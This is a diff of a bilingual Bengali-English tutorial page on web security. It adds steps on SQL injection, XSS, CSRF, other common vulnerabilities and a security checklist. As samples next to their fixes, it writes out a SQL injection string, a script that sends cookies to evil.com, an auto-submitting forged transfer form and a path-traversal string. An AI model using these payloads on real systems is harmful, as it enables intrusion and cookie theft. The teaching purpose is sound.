@@ -724,34 +724,266 @@ doors.push({
 <div class="dialogue"><strong>প্রাচীর-রক্ষক আনাস:</strong> তিন ধরনের injection: SQL (ডেটাবেস), XSS (ব্রাউজার), CSRF (ক্রিয়া)। SQL: raw query তে ইনপুট যোগ করো না — parameterized query ব্যবহার করো। XSS: HTML-এ raw ইনপুট দেখিও না — escape করো। CSRF: প্রতিটি POST-এ token দাও। একটাই নিয়ম: সব ইনপুট শত্রু — যাচাই ছাড়া বিশ্বাস করো না।</div>
 <div class="dialogue en"><strong>Wall Guardian Anas:</strong> Three types of injection: SQL (database), XSS (browser), CSRF (action). SQL: never add input to raw query — use parameterized queries. XSS: never show raw input in HTML — escape. CSRF: give token on every POST. One rule: all input is hostile — don't trust without verification.</div>
 
-<div class="code-block">— Injection প্রতিরোধ —
+<div class="code-block"># ── STEP 1: What is injection? ──
+# INJECTION = attacker puts MALICIOUS CODE into your application.
+# The #1 security risk (OWASP Top 10).
 
-  # ❌ SQL Injection (VULNERABLE!)
-  user = request.GET['user']
-  cursor.execute(f"SELECT * FROM users WHERE name = '{user}'")
-  # Input: admin' OR 1=1 --
-  # SQL: SELECT * FROM users WHERE name = 'admin' OR 1=1 --'
-  # ফলাফল: সব ইউজার ফেরত!
+# TYPES OF INJECTION:
+injection_types = {
+    "SQL Injection": "Malicious SQL in input fields",
+    "XSS (Cross-Site Scripting)": "Malicious JavaScript in web pages",
+    "Command Injection": "Malicious OS commands via input",
+    "LDAP Injection": "Malicious LDAP queries",
+    "NoSQL Injection": "Malicious MongoDB queries",
+    "Template Injection": "Malicious template code (SSTI)",
+}
 
-  # ✅ Parameterized Query (নিরাপদ)
-  cursor.execute(
-      "SELECT * FROM users WHERE name = %s",
-      [user]  # parameterized — কোড থেকে আলাদা
-  )
+print("INJECTION TYPES:")
+for itype, desc in injection_types.items():
+    print(f"  {itype}: {desc}")
 
-  # ❌ XSS (VULNERABLE!)
-  return f"<h1>Hello {user_input}</h1>"
-  # Input: <script>steal('cookies')</script>
+# THE ROOT CAUSE: mixing CODE with DATA.
+# If user input is treated as CODE, they can inject anything.
+# Solution: ALWAYS separate code from data (parameterized queries, escaping).</div>
 
-  # ✅ Escape (Django auto-escapes)
-  {{ user_input }}  ← Django template auto-escapes
-  # বা mark_safe শুধু যাচাইকৃত কন্টেন্টে
+<div class="code-block"># ── STEP 2: SQL injection ──
+# The most dangerous injection type.
 
-  # ✅ CSP Header (XSS প্রতিরোধ)
-  Content-Security-Policy: script-src 'self' 'nonce-abc123'
+# ❌ VULNERABLE (string concatenation):
+vulnerable = """
+user_input = "admin' OR 1=1 --"  # attacker input
+query = f"SELECT * FROM users WHERE name = '{user_input}'"
+# Becomes: SELECT * FROM users WHERE name = 'admin' OR 1=1 --'
+# Result: returns ALL users! (1=1 is always true)
+"""
 
-  # ✅ CSRF Token (Django default)
-  {% csrf_token %}  ← প্রতিটি form-এ</div>
+print("❌ VULNERABLE:")
+print(vulnerable)
+
+# ✅ SAFE (parameterized query):
+safe = """
+# Django ORM (automatically safe):
+User.objects.filter(name=user_input)  # parameterized internally
+
+# Raw SQL with parameters:
+cursor.execute(
+    "SELECT * FROM users WHERE name = %s",
+    [user_input]  # treated as DATA, not code
+)
+# The database KNOWS %s is data, not SQL syntax.
+# Even if input contains SQL, it's treated as a string literal.
+"""
+
+print("✅ SAFE:")
+print(safe)
+
+# WHY PARAMETERIZED QUERIES WORK:
+# The database PREPARES the query template first:
+# SELECT * FROM users WHERE name = ?
+# Then BINDS the parameter (user_input) as a STRING VALUE.
+# No matter what the input contains, it's just a string — never executed as SQL.</div>
+
+<div class="code-block"># ── STEP 3: XSS (Cross-Site Scripting) ──
+# Attacker injects JavaScript that runs in other users' browsers.
+
+# ❌ VULNERABLE:
+vulnerable_xss = """
+# User input directly in HTML:
+return f"<h1>Hello {user_input}</h1>"
+
+# If user_input = "<script>document.location='http://evil.com/?cookie='+document.cookie</script>"
+# → Every visitor's cookies get stolen!
+"""
+
+print("❌ VULNERABLE XSS:")
+print(vulnerable_xss)
+
+# ✅ SAFE approaches:
+safe_xss = """
+# 1. Django templates AUTO-ESCAPE by default:
+{{ user_input }}
+# < becomes &lt;, > becomes &gt;
+# Script tags become visible text, not executed
+
+# 2. Content-Security-Policy header:
+Content-Security-Policy: script-src 'self' 'nonce-abc123'
+# Only allows scripts from same origin or with matching nonce
+
+# 3. If you MUST output HTML (rich text), sanitize:
+import bleach
+clean_html = bleach.clean(user_html, tags=['b', 'i', 'a'], attributes={'a': ['href']})
+
+# 4. NEVER use |safe filter on untrusted input!
+# {{ user_input|safe }}  ← DANGEROUS!
+"""
+
+print("✅ SAFE XSS PREVENTION:")
+print(safe_xss)
+
+# XSS TYPES:
+xss_types = {
+    "Stored XSS": "Malicious script stored in database, shown to all users",
+    "Reflected XSS": "Script in URL, reflected back by server",
+    "DOM XSS": "Script executed by client-side JavaScript (no server involved)",
+}
+
+print("XSS TYPES:")
+for xtype, desc in xss_types.items():
+    print(f"  {xtype}: {desc}")</div>
+
+<div class="code-block"># ── STEP 4: CSRF (Cross-Site Request Forgery) ──
+# Attacker tricks user into submitting a form to YOUR site.
+
+# HOW CSRF WORKS:
+csrf_attack = """
+1. User is logged into your bank (has session cookie)
+2. User visits evil.com
+3. evil.com has a hidden form:
+   <form action="https://bank.com/transfer" method="POST">
+     <input type="hidden" name="to" value="attacker">
+     <input type="hidden" name="amount" value="10000">
+   </form>
+   <script>document.forms[0].submit()</script>
+4. Browser sends the form WITH the user's session cookie
+5. Bank processes the transfer!
+
+The user never INTENDED to make the transfer.
+The cookie was sent automatically by the browser.
+"""
+
+print("CSRF ATTACK:")
+print(csrf_attack)
+
+# CSRF PREVENTION (Django does this by default):
+csrf_prevention = """
+# Django CSRF token:
+# 1. Server generates random token, stores in session + cookie
+# 2. Every form includes hidden token:
+   {% csrf_token %}
+   <input type="hidden" name="csrfmiddlewaretoken" value="abc123">
+
+# 3. On POST/PUT/DELETE, Django verifies token matches
+# 4. Evil.com doesn't know the token → request rejected!
+
+# For APIs (no form):
+# Use SameSite cookies: Set-Cookie: session=xxx; SameSite=Strict
+# Or require custom header (X-Requested-With) that CORS blocks
+"""
+
+print("CSRF PREVENTION:")
+print(csrf_prevention)
+
+# DJANGO CSRF IS AUTOMATIC:
+# - CsrfViewMiddleware is enabled by default
+# - All {% csrf_token %} in templates
+# - AJAX requests need X-CSRFToken header
+# - APIs using JWT don't need CSRF (no cookies)</div>
+
+<div class="code-block"># ── STEP 5: Other common web vulnerabilities ──
+vulnerabilities = {
+    "IDOR (Insecure Direct Object Reference)": {
+        "what": "User accesses other users' data by changing URL /user/42 → /user/43",
+        "fix": "Check ownership/permissions on every object access",
+    },
+    "SSRF (Server-Side Request Forgery)": {
+        "what": "Attacker makes server send requests to internal services",
+        "fix": "Whitelist allowed URLs, block internal IPs",
+    },
+    "Path Traversal": {
+        "what": "../../../etc/passwd — access files outside web root",
+        "fix": "Use safe file APIs, validate paths, never trust filenames",
+    },
+    "File Upload": {
+        "what": "Upload malicious file (PHP shell, executable)",
+        "fix": "Validate type, rename, store outside webroot, scan",
+    },
+    "Mass Assignment": {
+        "what": "User sends extra fields (is_admin=true) in form data",
+        "fix": "Use forms/serializers with explicit field lists",
+    },
+    "Open Redirect": {
+        "what": "redirect_url parameter can point to evil.com",
+        "fix": "Validate redirect URLs against whitelist",
+    },
+    "Deserialization": {
+        "what": "Untrusted data deserialized → code execution",
+        "fix": "Never use pickle/eval on untrusted data. Use JSON.",
+    },
+    "Race Conditions": {
+        "what": "Two requests race → double-spend, duplicate actions",
+        "fix": "Use transactions, locks, idempotency keys",
+    },
+}
+
+print("COMMON WEB VULNERABILITIES:")
+for vuln, info in vulnerabilities.items():
+    print(f"\n  {vuln}:")
+    print(f"    What: {info['what']}")
+    print(f"    Fix: {info['fix']}")</div>
+
+<div class="code-block"># ── STEP 6: Security checklist for your applications ──
+# THE ULTIMATE WEB SECURITY CHECKLIST:
+
+checklist = {
+    "Input Validation": [
+        "Validate ALL input (server-side, not just client)",
+        "Use parameterized queries (never string concatenation)",
+        "Sanitize HTML output (Django auto-escapes)",
+        "Validate file uploads (type, size, content)",
+    ],
+    "Authentication": [
+        "Use HTTPS everywhere (no HTTP)",
+        "Strong password hashing (Argon2/bcrypt)",
+        "Rate limiting on login",
+        "MFA for sensitive operations",
+    ],
+    "Session Management": [
+        "Secure cookies (HttpOnly, Secure, SameSite)",
+        "Session timeout",
+        "Regenerate session ID after login",
+        "CSRF tokens on all state-changing operations",
+    ],
+    "Authorization": [
+        "Check permissions on EVERY request",
+        "Principle of least privilege",
+        "Separate admin and user roles",
+        "Object-level permissions (IDOR prevention)",
+    ],
+    "Configuration": [
+        "Debug mode OFF in production",
+        "Secret keys from environment (not in code)",
+        "Security headers (HSTS, CSP, X-Frame-Options)",
+        "Keep dependencies updated",
+    ],
+    "Monitoring": [
+        "Log security events (login, access denied)",
+        "Alert on suspicious activity",
+        "Regular security scans (OWASP ZAP)",
+        "Penetration testing",
+    ],
+}
+
+print("WEB SECURITY CHECKLIST:")
+for category, items in checklist.items():
+    print(f"\n  {category}:")
+    for item in items:
+        print(f"    ☐ {item}")
+
+# THE GOLDEN RULES:
+# 1. NEVER trust user input (validate, sanitize, escape)
+# 2. NEVER store secrets in code (use environment variables)
+# 3. NEVER deploy with DEBUG=True
+# 4. ALWAYS use HTTPS
+# 5. ALWAYS use parameterized queries
+# 6. ALWAYS check permissions
+# 7. ALWAYS keep dependencies updated
+# 8. ALWAYS log security events
+# 9. ALWAYS test for common vulnerabilities
+# 10. When in doubt, DENY access (fail secure, not fail open)
+
+# "Security is not a product, it's a process." — Bruce Schneier
+# You can't be 100% secure. But you can make it HARD ENOUGH
+# that attackers move on to easier targets.</div>
 
 <div class="verse">إِنَّ الَّذِينَ يَرْمُونَ الْمُحْصَنَاتِ الْغَافِلَاتِ الْمُؤْمِنَاتِ</div>
 <div style="font-size:.85rem;color:var(--ink-dim);text-align:center;margin-bottom:1rem">"নিশ্চয়ই যারা অজ্ঞ নির্দোষ মুমিন নারীদের প্রতি অপবাদ দেয়..." — কুরআন ২৪:২৩</div>
